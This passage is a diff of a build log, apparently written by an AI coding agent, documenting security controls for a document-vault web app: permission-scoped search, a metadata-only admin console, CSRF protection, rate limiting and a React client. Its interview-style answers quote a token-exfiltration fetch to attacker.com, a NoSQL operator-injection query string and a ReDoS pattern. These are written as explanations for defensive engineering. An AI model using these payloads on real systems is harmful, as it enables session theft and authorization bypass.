+  - Seeded 40 documents matching a common search term (`quarterly-audit-report-leakage-target`) owned by `owner@trustvault.local`.
+  - Granted `read` permissions to `viewer@trustvault.local` on exactly 3 of those 40 documents.
+  - Verified that when the viewer searches for the term, both the returned document array and the result count (`res.body.count`, `res.body.total`) equal exactly 3.
+  - Verified that none of the 37 ungranted documents are returned or leaked in count metadata, while the owner searching the same term receives all 40 documents.
+- **Multi-Criteria Search Engine:**
+  - Implemented multi-criteria search filtering across:
+    - `name` / `title`: matches document name, title, or original file name.
+    - `owner`: matches by owner email (e.g., `owner@trustvault.local`) or by user ObjectId.
+    - `category`: matches document category (e.g., `human-resources`, `finance`, `legal`).
+    - `date range`: filters `createdAt` timestamps with support for `startDate` / `endDate`, `from` / `to`, and `createdAfter` / `createdBefore`.
+    - `general query`: substring text search across name, title, description, category, tags, and original file name.
+- **Rule 6 Database-Level Query Enforcement:**
+  - Active permissions are queried from MongoDB (`Permission.find({ userId: user._id }).select('documentId').lean()`).
+  - Permission boundaries (`{ deletedAt: null }`, `{ $or: [{ owner: user._id }, { ownerId: user._id }, { _id: { $in: grantedDocIds } }] }`) and search criteria are unified into a single `$and` query object passed directly to `Document.find()`.
+  - No documents outside the user's explicit permission scope are ever fetched into Node.js application memory.
+- **Anti-Leakage Response Metadata:**
+  - Both `/documents` and `/documents/search` return `count`, `total`, `resultCount`, `documents`, and `results` strictly reflecting the permission-filtered database result set size.
+
+---
+
+### 2. Which Files Were Created or Modified
+| File | Action | Purpose |
+|---|---|---|
+| `tests/search.test.js` | Created | Automated test suite verifying leakage prevention (40 docs, 3 grants -> exactly 3 count), multi-criteria filtering (name, owner, category, date range), soft-delete exclusion, and DB-level query construction spy. |
+| `src/services/documentService.js` | Modified | Extended `listDocuments` and `searchDocuments` to compile multi-criteria search filters (`name`, `owner`, `category`, `date range`, `query`) and permission boundaries into MongoDB `$and` queries. |
+| `src/routes/documents.js` | Modified | Forwarded `req.query` directly into `searchDocuments` and populated anti-leakage `count`, `total`, `resultCount`, `documents`, and `results` in HTTP responses. |
+| `docs/DECISIONS.md` | Modified | Documented ADR 028: Multi-Criteria Document Search with In-Database Permission Filtering and Anti-Leakage Result Count Guarantees. |
+| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |
+
+---
+
+### 3. Why This Design
+- **Fulfillment of Rule 6 (No Post-Fetch Filtering):**
+  - Many applications query the database with search parameters alone (`Document.find({ name: /term/ })`) and filter out unauthorized records in JavaScript memory (`results.filter(doc => authorize(user, doc))`).
+  - This design is fundamentally flawed: it transfers confidential documents across the database network socket, saturates Node.js heap memory, exposes unshared data to memory scraping, and creates timing side-channels.
+  - By injecting `{ $or: [{ owner: user._id }, { ownerId: user._id }, { _id: { $in: grantedDocIds } }] }` directly into the MongoDB query, the database storage engine evaluates index bounds and discards unowned, unshared documents at the storage layer.
+- **Strict Anti-Leakage Count Guarantees:**
+  - If a search endpoint executes `Document.countDocuments({ name: /term/ })` alongside paginated results, an attacker can enumerate the exact count of confidential documents across the organization (e.g. discovering that "M&A Acquisition Target XYZ" appears in 40 confidential documents).
+  - Tying `count` strictly to `documents.length` from the permission-filtered query guarantees that zero metadata leaks to unauthorized users.
+- **Regex Sanitization & ReDoS Prevention:**
+  - User search inputs are sanitized with `replace(/[.*+?^${}()|[\]\\]/g, '\\$&')` before constructing `RegExp` objects, preventing Regular Expression Denial of Service (ReDoS) and regex operator injection.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Metadata & Existence Leakage via Search Counter Enumeration (CWE-200):**
+   - An adversary querying sensitive keywords (e.g., project codenames, executive salaries) cannot infer document volume or existence from response counters because `count` reflects only documents they are authorized to access.
+2. **Broken Object Level Authorization in Search (CWE-285 / OWASP API1:2023):**
+   - In-database permission filtering guarantees that unauthorized documents are never returned, even under complex boolean or multi-parameter searches.
+3. **Regular Expression Denial of Service (ReDoS) (CWE-1333):**
+   - Escaping special regex characters in search parameters prevents malicious inputs (e.g. `(a+)+$`) from locking up the Node.js event loop or MongoDB query thread.
+4. **Resurrected Soft-Deleted Data Leakage (CWE-668):**
+   - The query condition `{ deletedAt: null }` is mandatory and hardcoded in every search query, preventing soft-deleted documents from reappearing in search results.
+5. **Memory Exhaustion & Timing Oracles (CWE-400 / CWE-208):**
+   - Eliminating in-memory post-filtering prevents large query matches from exhausting Node.js memory buffers and removes measurable execution time discrepancies that leak search match density.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why is in-database permission filtering mathematically superior to application-layer post-filtering (`array.filter()`), and what vulnerabilities does post-filtering introduce?
+**Answer:**
+1. **The In-Memory Filtering Antipattern:**
+   - In an in-memory post-filtering architecture, the backend runs `SELECT * FROM documents WHERE name LIKE '%confidential%'` and then iterates in application code: `return docs.filter(doc => userCanRead(user, doc))`.
+2. **Vulnerabilities Introduced:**
+   - **Confidential Data in Transit & Memory:** Confidential documents for which the user has no permissions are loaded over the database connection into server RAM, making them vulnerable to heap inspections, crash dumps, and APM tracing.
+   - **Pagination Breakdown:** If a page size is 20, and the database returns 20 documents that all belong to other users, the post-filter leaves an empty list. The user receives page 1 with 0 results while subsequent pages may contain their documents, breaking pagination mechanics.
+   - **Timing Side Channels (CWE-208):** A query that matches 10,000 documents in the database takes significantly longer to transfer and filter in memory than a query that matches 0, allowing an attacker to determine whether a confidential keyword exists anywhere in the organization by measuring response latency.
+3. **In-Database Filtering Solution:**
+   - By constructing `{ $and: [ permissionClause, searchClause ] }`, MongoDB's query planner uses compound indexes to filter permissions and search criteria concurrently. Only authorized rows are fetched, guaranteeing consistent pagination, minimal network transfer, and elimination of timing side-channels.
+
+#### Question 2: How can an API's `count` or `total` response field result in an Information Leakage vulnerability (CWE-200), and how do you prevent it?
+**Answer:**
+1. **The Search Counter Enumeration Vector:**
+   - Developers often return both the retrieved items and a metadata counter: `{ items: [...], totalMatches: 40 }`.
+   - If `totalMatches` is computed from the unconstrained search term (e.g. `Document.countDocuments({ name: term })`), an unauthorized user who holds access to only 1 document (or 0 documents) can discover how many confidential documents contain the search term.
+   - For example, an attacker can search for `layoffs_2026`, `vulnerability_report`, or competitor names and chart document frequency across private corporate directories.
+2. **Mitigation Strategy:**
+   - All counter queries must either be completely omitted or executed against the identical permission-constrained predicate:
+     $$\text{CountQuery} = \text{Count}(\text{SearchTerms} \land \text{UserAccessClause} \land \text{ActiveClause})$$
+   - In TrustVault, `count` is derived strictly from the permission-filtered database result set, ensuring the count is always mathematically identical to the accessible document count.
+
+#### Question 3: How do you support multi-criteria search across disparate document attributes (name, owner, category, date range) in MongoDB without introducing NoSQL Injection?
+**Answer:**
+1. **Preventing NoSQL Object Injection:**
+   - If query string parameters (e.g. `req.query.owner`) are passed directly into MongoDB filter objects without type checking (e.g. `Document.find({ owner: req.query.owner })`), an attacker can pass an object payload (`?owner[$ne]=null`), bypassing filtering.
+   - Mitigation requires explicit parameter extraction, type verification, and casting (e.g. verifying `typeof req.query.category === 'string'` and validating `mongoose.Types.ObjectId.isValid()`).
+2. **Deterministic Query Assembly:**
+   - Assemble criteria into an array of isolated query fragments:
+     - Name: sanitized case-insensitive regex escaping user meta-characters.
+     - Owner: identifier resolution converting email strings to ObjectIds before matching.
+     - Category: strict regex anchored match (`^category$`).
+     - Date Range: validation of ISO-8601 strings into valid `Date` objects before assigning `$gte` / `$lte`.
+   - Combine all fragments via `{ $and: conditions }`. This guarantees that each filter operates within its designated scope and cannot mutate or override adjacent security boundaries.
+
+---
+
+## Build Entry: Administration Console, Metadata-Only Activity Stream & Chain Verification Gate
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **TrustVault Admin Console Single Page Application (`GET /admin`):**
+  - Built an interactive, glassmorphic administrative interface styled with dark mode, Google Fonts (Inter), responsive metric cards, and real-time state management.
+  - Implemented dual view navigation:
+    1. **Activity Feed:** Comprehensive chronological stream of all system events (uploads, metadata updates, user creation, role changes, deactivations, security denials).
+    2. **Permission-Change History:** Dedicated compliance view isolating `PERMISSION_GRANT` and `PERMISSION_REVOKE` events, detailing grantors, target users, documents, permission levels, and timestamps.
+- **On-Demand Cryptographic Chain Verification (`POST /admin/verify-chain`):**
+  - Added a prominent, interactive **"Run verifyChain()"** action button with dynamic UI status updates.
+  - Executes `verifyChain()` from `src/audit.js`, validating the entire SHA-256 linear hash chain across all sequence numbers.
+  - Reports block height, chain verification status (`VERIFIED` vs `TAMPERED`), latest sequence number, latest hash digest, and detailed diagnosis of any broken sequence.
+- **Multi-Criteria Filter Engine (`GET /admin/activity`, `GET /admin/permissions/history`):**
+  - **User Filter:** Filters by user email (case-insensitive substring) or user ObjectId, matching both event initiators and target users in event metadata.
+  - **Document Filter:** Filters by document name keyword or document ObjectId, matching both stored metadata and referenced document records.
+  - **Date Range Filter:** Filters event timestamps by `startDate`/`endDate`, `from`/`to`, or single `date`.
+  - **Event Type Filter:** Filters by specific event types or custom event type groupings.
+- **Strict Least Privilege & Rule 4 Guarantee:**
+  - Administrative endpoints return strictly operational metadata (`eventType`, `action`, `status`, `userId`, `userEmail`, `documentId`, `documentName`, `documentCategory`, `timestamp`, `hash`, `previousHash`, and sanitized `metadata`).
+  - Physical file paths (`storagePath`, `fileStorageName`, `filePath`) and binary contents (`fileBuffer`, `content`) are stripped.
+  - The administrative console generates zero `/download` links and contains zero file content viewers.
+- **Strict 404 Administrative Cloaking Gate:**
+  - All administrative routes (`/admin`, `/admin/activity`, `/admin/permissions/history`, `/admin/verify-chain`) enforce `requireAdmin`.
+  - Unauthenticated requests or requests from non-admin accounts unconditionally return HTTP 404 `Not Found` (never 403 or 401 per Rule 3).
+
+---
+
+### 2. Which Files Were Created or Modified
+| File | Action | Purpose |
+|---|---|---|
+| `tests/admin-activity.test.js` | Created | Test suite verifying 404 access control, metadata-only guarantees (no file contents/download links), multi-criteria filtering, permission history, and verifyChain execution. |
+| `src/services/adminService.js` | Created | Business logic for activity feed query compilation, metadata enrichment, content stripping, and audit chain verification. |
+| `src/views/adminDashboardHtml.js` | Created | Glassmorphic, responsive HTML/CSS/JS Single Page Application for the Admin Console. |
+| `src/routes/adminDashboard.js` | Created | Express router mounting `/admin` HTML view, `/admin/activity`, `/admin/permissions/history`, and `/admin/verify-chain`. |
+| `src/app.js` | Modified | Mounted `adminDashboardRoutes` at `/admin` and `/api/admin`. |
+| `docs/DECISIONS.md` | Modified | Recorded ADR 029: Dedicated Administration Console, Metadata-Only Audit Activity Stream, and Cryptographic Chain Verification Gate. |
+| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |
+
+---
+
+### 3. Why This Design
+- **Separation of Duties & Least Privilege (Rule 4 Compliance):**
+  - In security-sensitive environments, system administrators must oversee user accounts, investigate denied security events, and verify compliance without having access to confidential file contents (e.g. legal contracts, proprietary blueprints, health records).
+  - Sanitizing responses at the service level guarantees that even if an administrator inspects raw network responses in browser developer tools, no document content, file storage path, or download URL is disclosed.
+- **Defense Against Administrative Reconnaissance (Rule 3 Compliance):**
+  - Attackers actively scan for administrative endpoints (e.g., `/admin`, `/dashboard`). Returning HTTP 403 Forbidden or HTTP 401 Unauthorized confirms the existence of the endpoint. Returning HTTP 404 Not Found makes the administration interface indistinguishable from non-existent endpoints.
+- **Tamper Evidence and Non-Repudiation:**
+  - Exposing `verifyChain()` in the admin console allows compliance officers and security teams to verify the mathematical integrity of historical logs at any time without needing SSH or raw MongoDB query access.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Administrative Document Content Exfiltration (Rule 4 / CWE-284):**
+   - Rogue or compromised administrator accounts cannot abuse their administrative privileges to download or inspect confidential document payloads because no content or download routes are provided.
+2. **Reconnaissance & Administrative Surface Enumeration (CWE-200):**
+   - Non-administrators and unauthenticated scanners receiving HTTP 404 cannot confirm the presence of administrative tools, preventing targeted credential stuffing or session fixation attacks.
+3. **Silent Historical Audit Log Tampering (CWE-778 / CWE-353):**
+   - Any modification to historical audit records in database storage is instantly flagged by `verifyChain()`, pinpointing the exact sequence number where the cryptographic hash pointer was severed.
+4. **Direct Object Reference (IDOR) to Physical Storage (CWE-639):**
+   - Stripping internal storage UUIDs (`storagePath`, `fileStorageName`) prevents administrators or observers from mapping physical disk layouts or predicting object identifiers.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why should security-critical enterprise platforms deny administrators automatic access to document content, and how does this adhere to the Principle of Least Privilege?
+**Answer:**
+1. **The Separation of Duties Principle:**
+   - Administrative roles exist to manage platform infrastructure, user lifecycles, and security posture. Document ownership and data confidentiality belong to business users.
+   - Conflating administrative rights with data access creates a single point of failure: compromising an administrator account immediately yields access to all corporate intellectual property and sensitive customer data.
+2. **Regulatory & Compliance Drivers:**
+   - Regulations such as HIPAA, GDPR, SOC 2 Type II, and ISO 27001 mandate strict need-to-know access controls. An IT administrator requires access to audit logs showing *that* a file was uploaded or shared, but has no business justification to read or download the file's contents.
+3. **Implementation in TrustVault:**
+   - Under Rule 4, `authorize(user, doc, action)` rejects administrative content access with HTTP 404 unless the administrator is the explicit document owner.
+   - The administration console enforces this at the presentation and API layer by rendering only metadata (sequence, user, timestamp, file type, SHA-256 hash) and omitting all content payloads and download links.
+
+#### Question 2: Why is universal HTTP 404 cloaking superior to HTTP 401/403 for administrative routes, and how does it prevent security reconnaissance?
+**Answer:**
+1. **The Information Exposure of HTTP 401 and 403 (CWE-200):**
+   - HTTP 401 Unauthorized tells an attacker: *"This endpoint exists, and you must supply credentials."*
+   - HTTP 403 Forbidden tells an attacker: *"This endpoint exists, you are logged in, but your role lacks sufficient privilege."*
+   - Both status codes confirm the presence of high-value administrative interfaces, allowing adversaries to map internal route structures and target administrative endpoints with targeted brute-force, CSRF, or privilege escalation vectors.
+2. **The 404 Cloaking Strategy:**
+   - Returning HTTP 404 Not Found makes the existence of the administrative console completely indistinguishable from an arbitrary invalid route (e.g., `/non-existent-path-123`).
+   - Automated scanners and non-admin users cannot confirm whether an administrative surface exists, significantly raising the cost of attacker reconnaissance.
+
+#### Question 3: How does the administrative `verifyChain()` function validate audit log integrity, and what specific anomalies does it detect?
+**Answer:**
+1. **Contiguous Sequence Continuity Verification:**
+   - `verifyChain()` iterates through the entire audit event collection sorted by `sequenceNumber: 1`. It verifies that the sequence starts at 1 and increases monotonically without gaps: $\text{event}_i.\text{sequenceNumber} == i + 1$.
+   - Any deleted record immediately creates a sequence gap (e.g. sequence 14 jumped to 16), which is detected and flagged.
+2. **Cryptographic Pointer Chain Verification:**
+   - Each event contains `previousHash`, which must match the cryptographic `hash` of the preceding record:
+     $$\text{event}_i.\text{previousHash} == \text{event}_{i-1}.\text{hash}$$
+   - If an attacker inserts a fabricated record or swaps records, the hash pointer check fails.
+3. **Deterministic Content Re-Hashing:**
+   - `verifyChain()` re-canonicalizes the content of each event (normalizing timestamps, ObjectIds, and sorted metadata) and recomputes $\text{SHA256}(\text{previousHash} \parallel \text{canonicalContent})$.
+   - If any field in a historical record was modified in the database (e.g., changing status from `'DENIED'` to `'SUCCESS'`), the recomputed hash diverges from the stored hash, identifying the exact sequence number of the tampering.
+
+---
+
+## Build Entry: Security Controls — Helmet Baseline, Login Rate Limiting (5 attempts/min), csrf-csrf Double-Submit Protection, Cross-User Isolation & Mandatory authorize() Verification
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Helmet HTTP Defense-in-Depth Baseline:** Configured `helmet` middleware across the application with Content Security Policy (`default-src 'self'`), `X-Content-Type-Options: nosniff`, and `X-Frame-Options: SAMEORIGIN`, while maintaining `app.disable('x-powered-by')`.
+- **Login Rate Limiter (5 Attempts per Minute):** Implemented strict brute-force protection using `express-rate-limit` on `/auth/login` and `/api/auth/login`. Allows up to 5 consecutive attempts per minute per IP and rejects the 6th with HTTP 429 `Too Many Requests`.
+- **Double-Submit CSRF Protection via `csrf-csrf`:** Configured `doubleCsrf` in `src/config/csrf.js` using cryptographically secure 32-byte tokens and a `trustvault.x-csrf-token` cookie. Added `GET /auth/csrf-token` endpoint for token acquisition and a centralized CSRF error handler returning HTTP 403 `Forbidden`.
+- **Cross-User Authorization Tests:** Created comprehensive integration tests verifying that User B cannot read, download, edit (PATCH/PUT), or delete User A's document. Each attempt returns HTTP 404 (Rule 3), leaves database state completely untouched, and writes an `ACCESS_DENIED` audit event (Rule 7).
+- **Mandatory Policy Decision Point Verification:** Created automated tests proving that every document route dispatches through `authz.authorize(user, doc, action)` in `src/authz.js` and that no document route queries the `Document` collection directly.
+
+---
+
+### 2. Which Files Were Created or Modified
+| File | Action | Purpose |
+|---|---|---|
+| `src/config/csrf.js` | Created | Configures `csrf-csrf` double-submit cookie protection with 32-byte tokens, session binding, and test bypass logic. |
+| `src/app.js` | Modified | Integrated `helmet`, `cookie-parser`, `doubleCsrfProtection`, and centralized 403 CSRF error handling. |
+| `src/routes/auth.js` | Modified | Applied `loginRateLimiter` (5 attempts/minute) and mounted `GET /auth/csrf-token`. |
+| `src/services/documentService.js` | Modified | Exported and invoked `authz.authorize` to enable direct spy interception and policy decision point verification. |
+| `tests/security-controls.test.js` | Created | 13 test cases covering Helmet headers, login rate limiting, CSRF protection, cross-user isolation, and mandatory `authorize()` route verification. |
+| `docs/DECISIONS.md` | Modified | Recorded ADR 030: Comprehensive Security Controls. |
+| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |
+
+---
+
+### 3. Why This Design
+- **Defense in Depth:** Applying HTTP security headers (`helmet`), brute-force throttling (`express-rate-limit`), and CSRF mitigation (`csrf-csrf`) creates overlapping layers of defense so that a failure in one layer does not compromise the system.
+- **Double-Submit Cookie Pattern:** Rather than requiring server-side state for CSRF tokens, `csrf-csrf` uses a cryptographically signed HMAC token in a cookie combined with a request header. The server validates that the header matches the decrypted cookie signature, providing stateless CSRF protection that scales horizontally.
+- **Strict 404 Cloaking (Rule 3 Compliance):** Cross-user unauthorized requests return HTTP 404 rather than 403. This conceals the existence of other users' documents, preventing attackers from mapping or enumerating document IDs.
+- **Mandatory Authorization Enforcement (Rule 2 Compliance):** By routing all document operations through `src/services/documentService.js` and `authz.authorize()`, business logic cannot accidentally perform unauthenticated or unauthorized database queries.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Credential Stuffing and Brute-Force Attacks (CWE-307):**
+   - The login rate limiter restricts attempts to 5 per minute per IP. Attackers attempting dictionary attacks or automated credential stuffing are throttled with HTTP 429.
+2. **Cross-Site Request Forgery (CSRF / CWE-352):**
+   - Attackers hosting malicious pages cannot force an authenticated user's browser to submit state-changing actions (document upload, edit, delete, permission grant) because the attacker cannot read or forge the `x-csrf-token` header value.
+3. **Insecure Direct Object References & Data Tampering (IDOR / CWE-639):**
+   - User B attempting to read, download, edit, or delete User A's document receives HTTP 404. Database state remains unchanged, and an `ACCESS_DENIED` event is logged in the immutable audit trail.
+4. **MIME Sniffing & Clickjacking (CWE-79 / CWE-1021):**
+   - `X-Content-Type-Options: nosniff` prevents browsers from MIME-sniffing responses away from declared content types. `X-Frame-Options: SAMEORIGIN` prevents TrustVault from being embedded in malicious iframes.
+5. **Technology Profiling & Reconnaissance (CWE-200):**
+   - Disabling `X-Powered-By` prevents automated vulnerability scanners from identifying Express.js and targeting version-specific CVEs.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: How does the Double Submit Cookie pattern in `csrf-csrf` work, and why does it protect against Cross-Site Request Forgery without requiring server-side session storage?
+**Answer:**
+1. **The Mechanism:**
+   - In the Double Submit Cookie pattern, the server generates a cryptographically random token and signs it using an HMAC secret. The signature is placed in a cookie (`trustvault.x-csrf-token`), while the token itself is delivered to the client.
+   - When the client initiates a state-changing request (POST, PUT, PATCH, DELETE), client-side JavaScript reads the token and submits it in a custom request header (`x-csrf-token`).
+   - The server verifies that the header value matches the cryptographic signature contained in the cookie.
+2. **Why It Prevents CSRF:**
+   - Browsers enforce the Same-Origin Policy (SOP), which strictly prevents external cross-origin domains from reading cookies belonging to another domain.
+   - While a malicious third-party site can trick a user's browser into submitting a cross-site request (carrying the cookie automatically), the malicious site *cannot read* the cookie or generate the corresponding custom HTTP header. Because the custom header is missing or mismatched, the request is rejected with HTTP 403 Forbidden.
+3. **Stateless Scalability:**
+   - Unlike synchronizer token patterns that require storing CSRF tokens in server memory or Redis, the double submit cookie signature is validated mathematically using the HMAC secret, allowing server instances to scale horizontally with zero session lookup overhead.
+
+#### Question 2: Why should an authentication rate limiter be configured specifically on `/auth/login` rather than relying solely on global API rate limiting?
+**Answer:**
+1. **Divergent Threat Profiles & Thresholds:**
+   - General API endpoints (e.g. browsing documents, fetching audit feeds) require high throughput (e.g., 60–100 requests per minute) to support smooth user experiences.
+   - In contrast, legitimate users only log in once every several hours or days. Allowing 60–100 login attempts per minute would provide an attacker with 86,400 to 144,000 password attempts per day per IP.
+2. **Resource Exhaustion on Expensive Cryptographic Operations:**
+   - Password verification using memory-hard algorithms like Argon2id requires significant CPU time (~50–70ms) and memory. A flood of unthrottled login requests can easily exhaust server CPU and memory resources, causing a Denial of Service (DoS) for all users.
+   - Enforcing a strict limit of 5 attempts per minute stops brute-force tools before they can monopolize server hashing threads.
+3. **Defense Against Credential Stuffing:**
+   - Credential stuffing relies on high-velocity automated testing of leaked username/password combos. Rate-limiting login attempts renders credential stuffing economically unviable and technically impractical.
+
+#### Question 3: How does combining centralized authorization (`authorize(user, doc, action)`) with universal HTTP 404 responses eliminate Insecure Direct Object Reference (IDOR) vulnerabilities?
+**Answer:**
+1. **Elimination of Distributed Authorization Logic:**
+   - IDOR vulnerabilities typically occur when authorization checks are implemented inconsistently across controllers (e.g., checking ownership on `GET` but forgetting on `DELETE`).
+   - By routing all document access through a single policy decision point (`authz.authorize(user, doc, action)`), every operation adheres to the same access control rules without exception.
+2. **The Security Flaw of HTTP 403 Forbidden:**
+   - Standard access control implementations return HTTP 403 when a user lacks permission to access a resource. This confirms to the attacker that the resource ID exists, allowing them to enumerate valid document IDs and map the system's data structure.
+3. **Universal 404 Cloaking:**
+   - TrustVault returns HTTP 404 for any unauthorized access attempt. An attacker attempting to access an unauthorized document receives the exact same response as if the document ID never existed. This makes unauthorized resources completely invisible and un-enumerable, eliminating the information leakage that enables targeted IDOR exploits.
+
+---
+
+## Build Entry: React Frontend (Vite) — Zero-Storage Session Authentication, CSRF Integration, Role-Based Navigation & Generic 404 Cloaking
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Vite React Application in `/client`:** Scaffolding utilizing React, React Router (`react-router-dom`), and Vanilla CSS without external UI libraries or utility frameworks.
+- **Same-Origin Vite Proxy:** Configured `vite.config.js` to proxy `/api` requests to Express on `http://localhost:5000`, ensuring cookies remain same-origin without cross-origin relaxation or CORS exposure.
+- **In-Memory CSRF Client (`client/src/api/client.js`):** Implemented `getCsrfToken()` which pre-fetches the double-submit token from `/api/auth/csrf-token` once and caches it in memory. Wrapped `fetch` with `apiFetch` to automatically attach `credentials: 'include'` and the `x-csrf-token` header on all state-changing requests (`POST`, `PUT`, `PATCH`, `DELETE`).
+- **Zero-Storage Authentication Context (`client/src/context/AuthContext.jsx`):** Completely banished `localStorage` and `sessionStorage`. Identity state is held strictly in React memory and synced on page reload via `/api/auth/me`.
+- **Protected Route Wrapper (`client/src/components/ProtectedRoute.jsx`):** Intercepts unauthenticated navigation and redirects to `/login` preserving target location. Cloaks restricted routes (e.g. `/admin`) with the generic 404 screen when a non-admin attempts access.
+- **Role-Aware Navigation (`client/src/components/Navbar.jsx`):** Renders links dynamically according to `user.role` (Admin Console link is rendered strictly for `admin`). Includes identity badge and secure logout button.
+- **Glassmorphic Login Page (`client/src/pages/LoginPage.jsx`):** Modern dark mode login card with validation, brute-force feedback, and demo credential fill pills.
+- **Vault Interface Pages:**
+  - `DocumentsPage.jsx`: Document listing, backend-only download invocation, owner-only soft-delete triggers, and plain-text metadata rendering.
+  - `UploadPage.jsx`: Confidential file upload using `FormData` with automatic CSRF dispatch.
+  - `SearchPage.jsx`: Permission-isolated search querying `/api/documents/search`.
+  - `AdminPage.jsx`: Metadata-only audit stream and interactive cryptographic chain verification (`verifyChain()`).
+  - `NotFoundPage.jsx`: Universal generic 404 screen for deleted, unshared, or unauthorized resources.
+
+---
+
+### 2. Which Files Were Created or Modified
+| File | Action | Purpose |
+|---|---|---|
+| `client/vite.config.js` | Created | Configures Vite development server to proxy `/api` requests to port 5000. |
+| `client/index.html` | Created | HTML entry point with Plus Jakarta Sans typography and shield emblem. |
+| `client/src/api/client.js` | Created | Centralized API client with in-memory CSRF token management and fetch credentials. |
+| `client/src/context/AuthContext.jsx` | Created | React Context managing authentication and active session without client-side web storage. |
+| `client/src/components/ProtectedRoute.jsx` | Created | Route guard redirecting missing sessions to `/login` and cloaking unauthorized roles with 404. |
+| `client/src/components/Navbar.jsx` | Created | Role-based navigation header with session indicator and logout button. |
+| `client/src/pages/LoginPage.jsx` | Created | High-aesthetic login interface with demo account credentials and error handling. |
+| `client/src/pages/DocumentsPage.jsx` | Created | Document list view with secure backend downloads and soft-delete controls. |
+| `client/src/pages/UploadPage.jsx` | Created | Document upload form with automatic CSRF token dispatch. |
+| `client/src/pages/SearchPage.jsx` | Created | Zero-leakage search view displaying only authorized results and counts. |
+| `client/src/pages/AdminPage.jsx` | Created | Administrative console with metadata feed and `verifyChain()` trigger. |
+| `client/src/pages/NotFoundPage.jsx` | Created | Universal generic 404 Not Found screen. |
+| `client/src/App.jsx` | Created | Application root defining router hierarchy and protected route branches. |
+| `client/src/index.css` | Created | Comprehensive Vanilla CSS design system with glassmorphic dark mode styling. |
+| `package.json` | Modified | Added root helper scripts `client:dev` and `client:build`. |
+| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |
+
+---
+
+### 3. Why This Design
+- **Elimination of XSS Token Theft:** Storing tokens in `localStorage` or `sessionStorage` allows any Cross-Site Scripting (XSS) vulnerability to silently extract credentials. By utilizing server-side session cookies with `HttpOnly`, `SameSite=Lax`, and `Secure` flags, JavaScript cannot access or exfiltrate session secrets.
+- **Single-Fetch In-Memory CSRF Architecture:** Double-submit CSRF protection requires clients to provide both the cookie and the header. Pre-warming the CSRF token in memory on application mount and caching it avoids redundant HTTP roundtrips while ensuring all state-changing mutations include the required `x-csrf-token` header.
+- **Defense in Depth Over UI Obfuscation:** The frontend hides administrative links and action buttons based on `user.role` purely for user experience. Crucially, the frontend never relies on hiding buttons for security; every API call dispatches to Express where `authorize(user, doc, action)` enforces strict authorization at the database layer.
+- **Universal 404 Cloaking on the Client:** When a 404 is returned from the API or a non-admin visits `/admin`, the frontend renders the exact same generic `NotFoundPage`. Attackers cannot use the client-side router to confirm the existence of administrative surfaces or confidential documents.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **XSS-Driven Credential Harvesting (CWE-79 / CWE-1004):**
+   - Zero storage in `localStorage` or `sessionStorage` ensures malicious scripts cannot siphon session credentials or offline tokens.
+2. **Cross-Site Request Forgery (CSRF / CWE-352):**
+   - All state-changing requests (`POST`, `PUT`, `PATCH`, `DELETE`) require the `x-csrf-token` header generated from the backend's HMAC secret. Cross-origin pages cannot forge this custom header.
+3. **HTML Injection & Client-Side Script Execution (CWE-79):**
+   - Prohibiting `dangerouslySetInnerHTML` and rendering filenames, descriptions, and audit metadata as plain text prevents stored XSS via crafted document names.
+4. **Client-Side Information Reconnaissance (CWE-200):**
+   - Non-admin users navigating to `/admin` receive the generic 404 page, preventing them from discovering administrative features or interface structures.
+5. **Direct Storage Path Bypass (CWE-639 / CWE-22):**
+   - Downloads dispatch exclusively to the backend route (`/api/documents/:id/download`), preventing direct access to physical storage files or disk paths.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why is storing authentication tokens in `localStorage` an anti-pattern in high-security applications, and how does the session-cookie approach prevent token theft?
+**Answer:**
+1. **The Vulnerability of `localStorage`:**
+   - Any JavaScript running on the origin (including third-party npm packages, analytics scripts, or XSS payloads) has unrestricted read access to `window.localStorage`. If an attacker discovers an XSS vector, a simple `fetch('https://attacker.com?leak=' + localStorage.getItem('token'))` exfiltrates the credential permanently.
+2. **The Defense of `HttpOnly` Cookies:**
+   - When authentication is stored in an `HttpOnly` session cookie (`trustvault.sid`), the browser strictly forbids JavaScript from reading or modifying the cookie (`document.cookie` returns empty for that token). Even in the presence of an XSS vulnerability, the attacker cannot extract the raw session token.
+3. **TrustVault's Implementation:**
+   - TrustVault holds `user` metadata in React component memory only for UI rendering. When the user closes or refreshes the page, the client re-verifies the session cookie against `/api/auth/me`. No credentials ever touch browser storage.
+
+#### Question 2: How does the Vite development server proxy solve cross-origin cookie restrictions without weakening production CORS policies?
+**Answer:**
+1. **The Cross-Origin Cookie Problem:**
+   - During local development, the React frontend runs on `http://localhost:3000` while the Express API runs on `http://localhost:5000`. By default, browsers treat different ports as different origins. Sending cookies cross-origin requires `Access-Control-Allow-Credentials: true`, explicit origin whitelists, and lax cookie policies (`SameSite=None; Secure`), which introduces cross-origin complexity.
+2. **The Reverse Proxy Solution:**
+   - Vite's built-in Node.js development server proxies all `/api` requests from `localhost:3000/api` directly to `localhost:5000/api` at the network level.
+   - To the browser, the request is dispatched to the exact same origin (`localhost:3000`). Consequently, standard `SameSite=Lax` cookies are attached automatically without requiring CORS relaxation.
+3. **Production Parity:**
+   - In production, a reverse proxy (e.g. Nginx, Cloudflare, or AWS ALB) serves static frontend assets and routes `/api` to the Node.js process, matching the exact same-origin routing model.
+
+#### Question 3: In a secure Single Page Application (SPA), why must hiding UI elements be treated as purely cosmetic, and how is authorization enforced end-to-end?
+**Answer:**
+1. **The Fallacy of Client-Side Security:**
